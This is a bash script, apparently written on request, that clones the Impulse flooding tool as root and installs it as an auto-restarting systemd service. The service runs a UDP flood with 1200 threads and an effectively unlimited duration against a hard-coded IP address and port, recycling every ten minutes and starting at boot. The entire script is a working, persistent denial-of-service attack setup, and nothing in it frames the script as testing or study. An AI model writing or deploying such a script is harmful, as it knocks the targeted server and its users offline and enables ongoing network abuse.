#!/bin/bash

# 1. Install System Dependencies
sudo apt update
sudo apt install python3 python3-pip git -y

# 2. Setup Impulse directory in /root
cd /root
rm -rf Impulse
git clone https://github.com/LimerBoy/Impulse
cd Impulse/

# 3. Install Python requirements (Bypassing PEP 668)
pip3 install -r requirements.txt --break-system-packages

# 4. Create the Service File
# Note: We use absolute paths to ensure it works regardless of where the script is run.
cat <<EOF | sudo tee /etc/systemd/system/impulse2.service
[Unit]
Description=Impulse Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/Impulse
ExecStart=/usr/bin/python3 /root/Impulse/impulse.py --target 40.160.20.9:16261 --method UDP --time 99999999 --threads 1200
Restart=always
# This forces the 10-minute cycle you asked for
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 5. Refresh Systemd and Start
sudo systemctl daemon-reload
sudo systemctl enable impulse2.service
sudo systemctl restart impulse2.service

# 6. Final Status Check
echo "------------------------------------------"
systemctl is-active --quiet impulse2.service && echo "SUCCESS: impulse2 is running." || echo "FAILED: Check journalctl -u impulse2"
